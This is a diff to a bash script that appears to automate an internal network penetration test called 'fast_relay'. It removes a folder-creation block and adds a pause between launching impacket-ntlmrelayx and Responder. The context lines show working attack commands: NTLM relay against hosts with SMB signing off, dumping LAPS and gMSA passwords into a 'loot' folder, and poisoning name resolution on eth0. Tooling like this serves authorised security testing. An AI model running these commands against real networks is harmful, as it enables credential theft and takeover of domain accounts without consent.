@@ -13,13 +13,6 @@ else
 	exit 1
 fi
 
-if [ -d /root/output/nmap -a -d /root/output/list -a -d /root/input/msf -a -d /root/output/loot -a -d /root/output/msf ]; then
-    echo '! > Folder Exist!'
-else    
-    #Creating Output Folders
-    mkdir -p /root/output/nmap /root/output/list /root/input/msf /root/output/loot /root/output/msf
-fi
-
 echo "Start fast_relay" >> /root/output/runtime.txt
 date >> /root/output/runtime.txt
 
@@ -66,6 +59,7 @@ echo '! > Starting impacket-ntlmrelayx && Responder'
 export PYTHONUNBUFFERED=TRUE
 
 timeout 300 impacket-ntlmrelayx -6 -ts -ra --dump-laps --dump-gmsa -l /root/output/loot -of /root/output/loot/ntlm_relay_ntlmv2.txt -smb2support -tf /root/output/list/smb_sign_off.txt &> /root/output/relay.txt &
+sleep 5
 timeout 300 responder -I eth0 -wvFP &> /root/output/responder.txt &
 
 PID_RELAY=`jobs -l | awk '/ntlmrelayx/ {print$2}'`
